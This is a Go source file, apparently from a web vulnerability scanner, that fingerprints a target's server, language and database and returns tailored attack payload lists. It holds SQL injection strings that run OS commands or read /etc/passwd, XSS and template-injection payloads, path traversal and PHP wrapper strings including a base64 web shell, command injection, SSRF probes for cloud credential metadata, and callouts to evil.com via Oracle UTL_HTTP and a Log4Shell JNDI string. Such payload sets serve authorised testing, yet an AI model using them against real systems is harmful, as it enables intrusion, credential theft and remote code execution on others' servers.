// Package forge builds adaptive payloads based on detected technology stack,
// parameter data types, and target behavior. Instead of spraying generic
// payloads, forge selects the most lethal weapons for the specific target.
package forge

import (
	"fmt"
	"math/rand"
	"strings"
)

// Stack fingerprints detected on the target.
type Stack struct {
	Language string // "php", "java", "python", "ruby", "node", "go", "dotnet"
	Server   string // "apache", "nginx", "iis", "tomcat", "gunicorn", "express"
	Database string // "mysql", "postgresql", "mssql", "oracle", "mongo", "sqlite"
	OS       string // "linux", "windows", "unknown"
	CMS      string // "wordpress", "drupal", "joomla", "magento", ""
}

// ── Builders ─────────────────────────────────────────────────────────────

// SQLi returns optimal SQLi payloads for the detected database.
func (s *Stack) SQLi() []string {
	base := []string{
		"'", "''", "`", "\"", "\\",
		"' OR '1'='1", "' OR '1'='1'--", "' OR 1=1--",
		"\" OR \"1\"=\"1", "1 OR 1=1",
		"' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
		"admin'--", "' AND '1'='1",
	}

	switch s.Database {
	case "mysql":
		base = append(base,
			"' AND SLEEP(3)--", "1 AND SLEEP(3)",
			"' AND BENCHMARK(2000000,MD5(1))--",
			"' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
			"' UNION SELECT 1,2,3,4,5--",
			"' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
			"; SELECT LOAD_FILE('/etc/passwd')--",
		)
	case "postgresql":
		base = append(base,
			"'; SELECT pg_sleep(3)--",
			"' AND 1=(SELECT 1 FROM PG_SLEEP(3))--",
			"'; COPY (SELECT '') TO PROGRAM 'id'--",
			"' UNION SELECT NULL,string_agg(table_name,',') FROM information_schema.tables--",
		)
	case "mssql":
		base = append(base,
			"'; WAITFOR DELAY '0:0:3'--",
			"'; EXEC xp_cmdshell('whoami')--",
			"1; EXEC sp_configure 'show advanced options',1--",
			"' UNION SELECT NULL,table_name FROM information_schema.tables--",
		)
	case "oracle":
		base = append(base,
			"' OR 1=1--",
			"' UNION SELECT NULL FROM dual--",
			"' AND DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(66),5)=1--",
			"' AND UTL_HTTP.REQUEST('http://evil.com/')=1--",
		)
	case "sqlite":
		base = append(base,
			"' UNION SELECT 1,sqlite_version(),3--",
			"' UNION SELECT 1,sql,3 FROM sqlite_master--",
		)
	case "mongo":
		return []string{
			`{"$gt":""}`, `{"$ne":null}`, `{"$where":"1==1"}`,
			`{"$regex":".*"}`, `{"$exists":true}`,
			`[$gt]=""`, `[$ne]=null`, `[$regex]=.*`,
			`{"username":{"$gt":""},"password":{"$gt":""}}`,
		}
	}
	return base
}

// HTML returns XSS payloads that bypass common filters on this stack.
func (s *Stack) HTML() []string {
	base := []string{
		"<script>alert(1)</script>",
		"<img src=x onerror=alert(1)>",
		"<svg onload=alert(1)>",
		"<body onload=alert(1)>",
		"<details open ontoggle=alert(1)>",
		`"><script>alert(1)</script>`,
		`'><script>alert(1)</script>`,
	}

	switch s.Language {
	case "php":
		base = append(base, `<?php echo '<script>alert(1)</script>'; ?>`)
	case "node":
		base = append(base, `<%- require('child_process').exec('id') %>`, `{{= global.process.mainModule.require('child_process').execSync('id') }}`)
	case "java":
		base = append(base, `${7*7}`, `#{7*7}`, `<%= 7*7 %>`)
	case "python":
		base = append(base, `{{7*7}}`, `{% for x in (1,2,3) %}{{x}}{% endfor %}`)
	case "ruby":
		base = append(base, `<%= 7*7 %>`, `#{7*7}`)
	}

	// WAF bypass variants
	if s.Server == "apache" || s.Server == "nginx" {
		base = append(base,
			"<img/src=x/onerror=alert(1)>",
			"<svg><script>alert(1)</script></svg>",
			"<ScRiPt>alert(1)</ScRiPt>",
			"<IMG SRC=x ONERROR=alert(1)>",
			"<img src=x onerror=alert&#x28;1&#x29;>",
		)
	}

	return base
}

// PathTraversal returns traversal payloads tuned to the OS.
func (s *Stack) PathTraversal() []string {
	switch s.OS {
	case "windows":
		return []string{
			"..\\..\\..\\..\\windows\\win.ini",
			"..%5c..%5c..%5c..%5cwindows%5cwin.ini",
			"....//....//....//....//windows/win.ini",
			"C:\\Windows\\System32\\drivers\\etc\\hosts",
			"%SYSTEMROOT%\\win.ini",
		}
	default: // linux
		return []string{
			"../../../../etc/passwd",
			"../../../etc/passwd",
			"..%2F..%2F..%2F..%2Fetc%2Fpasswd",
			"..%252F..%252F..%252F..%252Fetc%252Fpasswd",
			"....//....//....//....//etc/passwd",
			"/proc/self/environ",
			"/proc/self/cmdline",
			"/proc/self/cwd/app.py",
			"/proc/self/cwd/.env",
		}
	}
}

// PHPWrappers returns LFI wrappers specific to PHP.
func (s *Stack) PHPWrappers() []string {
	if s.Language != "php" {
		return nil
	}
	return []string{
		"php://filter/convert.base64-encode/resource=index.php",
		"php://filter/read=convert.base64-encode/resource=index",
		"php://filter/convert.base64-encode/resource=config.php",
		"php://filter/convert.base64-encode/resource=wp-config.php",
		"php://filter/zlib.deflate/convert.base64-encode/resource=index.php",
		"php://filter/convert.iconv.utf-8.utf-16/resource=index.php",
		"php://input",
		"expect://id",
		"data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pg==",
		"data://text/plain,<?php system('id'); ?>",
	}
}

// CMDI returns command injection payloads tuned to the OS.
func (s *Stack) CMDI() []string {
	cmds := []string{"id", "whoami", "uname -a", "hostname", "cat /etc/passwd", "ls -la /"}
	seps := []string{";", "|", "`", "$(", "&&", "||", "%0a", "\n"}

	if s.OS == "windows" {
		cmds = []string{"whoami", "type C:\\Windows\\win.ini", "dir C:\\", "ipconfig", "net user"}
		seps = append(seps, "&")
	}

	var out []string
	for _, cmd := range cmds {
		for _, sep := range seps {
			out = append(out, sep+cmd, sep+" "+cmd)
		}
		out = append(out, fmt.Sprintf("`%s`", cmd), fmt.Sprintf("$(%s)", cmd))
	}

	// Blind time-based
	out = append(out, "; sleep 4", "| sleep 4", "`sleep 4`", "&& sleep 4")
	if s.OS == "windows" {
		out = append(out, "& timeout /T 4 /NOBREAK", "| timeout /T 4 /NOBREAK")
	}
	return out
}

// SSRF returns SSRF probes including cloud metadata URLs.
func (s *Stack) SSRF() []string {
	probes := []string{
		"http://169.254.169.254/latest/meta-data/",
		"http://169.254.169.254/latest/meta-data/iam/security-credentials/",
		"http://127.0.0.1:22/",
		"http://127.0.0.1:6379/",
		"http://localhost/",
		"file:///etc/passwd",
		"dict://127.0.0.1:11211/stats",
		"gopher://127.0.0.1:6379/_INFO",
	}

	switch s.Server {
	case "tomcat":
		probes = append(probes,
			"http://127.0.0.1:8080/manager/html",
			"http://127.0.0.1:8005/",
		)
	case "nginx":
		probes = append(probes,
			"http://127.0.0.1/nginx_status",
		)
	case "apache":
		probes = append(probes,
			"http://127.0.0.1/server-status",
		)
	}

	return probes
}

// NoSQL returns MongoDB/NoSQL injection payloads.
func (s *Stack) NoSQL() []string {
	return []string{
		`[$ne]=_impossible`, `[$gt]=`, `[$lt]=zzzzz`,
		`[$regex]=.*`, `[$regex]=^a`,
		`[$exists]=true`, `[$exists]=false`,
		`[$in][]=a`, `[$nin][]=a`,
		`[$where]=1==1`, `[$where]=sleep(3000)`,
		`{"$gt":""}`, `{"$ne":null}`, `{"$where":"1==1"}`,
		`{"$or":[{},{}]}`,
	}
}

// Boundary returns boundary values for a detected shape type.
func (s *Stack) Boundary(shape string) []string {
	switch shape {
	case "int":
		return []string{"-1", "0", "1", "2147483647", "-2147483648", "9223372036854775807", "9999999999", "NaN", "Infinity", "null"}
	case "email":
		return []string{"a@b.com", "x@x.x", "@", "a@", fmt.Sprintf("%s@%s.com", strings.Repeat("a", 255), strings.Repeat("b", 50))}
	case "url":
		return []string{"http://localhost", "file:///etc/passwd", "javascript:alert(1)", "gopher://127.0.0.1:6379/_", "dict://127.0.0.1:11211/"}
	case "bool":
		return []string{"true", "false", "1", "0", "yes", "no", "on", "off", "True", "False", "nil", "null"}
	case "date":
		return []string{"2024-01-01", "0000-00-00", "9999-12-31", "1970-01-01", "01/01/1970", "0", "0-0-0"}
	case "file":
		return []string{"shell.php", "shell.phtml", "shell.jsp", "shell.aspx", "image.jpg.php", "shell.php\x00.jpg"}
	case "json":
		return []string{"{}", `{"__proto__":{"isAdmin":true}}`, `{"constructor":{"prototype":{"isAdmin":true}}}`, `{"$gt":""}`}
	default:
		return []string{"", strings.Repeat("A", 4096), "%s%s%s", "%n%n%n", "${jndi:ldap://evil.com/a}", "\x00", "null", "undefined", "None"}
	}
}

// ── Stack detection from response fingerprints ───────────────────────────

// Detect builds a Stack from response headers and body fingerprints.
func Detect(headers map[string]string, body string) *Stack {
	s := &Stack{OS: "linux"}
	low := strings.ToLower(body)

	// Server
	server := strings.ToLower(headers["Server"] + headers["X-Powered-By"])
	switch {
	case strings.Contains(server, "apache"): s.Server = "apache"
	case strings.Contains(server, "nginx"): s.Server = "nginx"
	case strings.Contains(server, "iis") || strings.Contains(server, "microsoft"): s.Server = "iis"
	case strings.Contains(server, "tomcat"): s.Server = "tomcat"
	case strings.Contains(server, "gunicorn"): s.Server = "gunicorn"
	case strings.Contains(server, "express"): s.Server = "express"
	}

	// Language
	switch {
	case strings.Contains(server, "php"): s.Language = "php"
	case strings.Contains(server, "jsp") || strings.Contains(server, "servlet"): s.Language = "java"
	case strings.Contains(server, "asp") || strings.Contains(server, "dotnet"): s.Language = "dotnet"
	case strings.Contains(server, "node") || strings.Contains(server, "js") || strings.Contains(server, "express"): s.Language = "node"
	case strings.Contains(server, "python") || strings.Contains(server, "gunicorn") || strings.Contains(server, "werkzeug") || strings.Contains(server, "wsgi"): s.Language = "python"
	case strings.Contains(server, "ruby") || strings.Contains(server, "rails") || strings.Contains(server, "puma") || strings.Contains(server, "unicorn"): s.Language = "ruby"
	case strings.Contains(server, "go"): s.Language = "go"
	}

	// Body-based detection
	switch {
	case strings.Contains(low, "wp-content"): s.CMS = "wordpress"; s.Language = "php"
	case strings.Contains(low, "drupal"): s.CMS = "drupal"; s.Language = "php"
	case strings.Contains(low, "joomla"): s.CMS = "joomla"; s.Language = "php"
	case strings.Contains(low, "magento"): s.CMS = "magento"; s.Language = "php"
	case strings.Contains(low, "laravel"): s.Language = "php"
	case strings.Contains(low, "django"): s.Language = "python"
	case strings.Contains(low, "spring"): s.Language = "java"
	case strings.Contains(low, "rails"): s.Language = "ruby"
	}

	// Database hints
	switch {
	case strings.Contains(low, "mysql"): s.Database = "mysql"
	case strings.Contains(low, "sql syntax") || strings.Contains(low, "microsoft ole db"): s.Database = "mssql"
	case strings.Contains(low, "pg_query") || strings.Contains(low, "postgresql"): s.Database = "postgresql"
	case strings.Contains(low, "ora-"): s.Database = "oracle"
	case strings.Contains(low, "sqlite"): s.Database = "sqlite"
	case strings.Contains(low, "mongo") || strings.Contains(low, "bsontype"): s.Database = "mongo"
	case strings.Contains(low, "wp_"): s.Database = "mysql"
	}

	// OS hints
	switch {
	case strings.Contains(low, "win.ini") || strings.Contains(low, "windows") || strings.Contains(low, "nt authority"): s.OS = "windows"
	}

	return s
}

// ── Utility ──────────────────────────────────────────────────────────────

// Shuffle randomizes payload order so each scan run hits differently.
func Shuffle(items []string) []string {
	rand.Shuffle(len(items), func(i, j int) { items[i], items[j] = items[j], items[i] })
	return items
}

// Trim removes duplicates and limits to n entries.
func Trim(items []string, n int) []string {
	seen := make(map[string]bool, len(items))
	var out []string
	for _, item := range items {
		if !seen[item] {
			seen[item] = true
			out = append(out, item)
			if len(out) >= n {
				break
			}
		}
	}
	return out
}
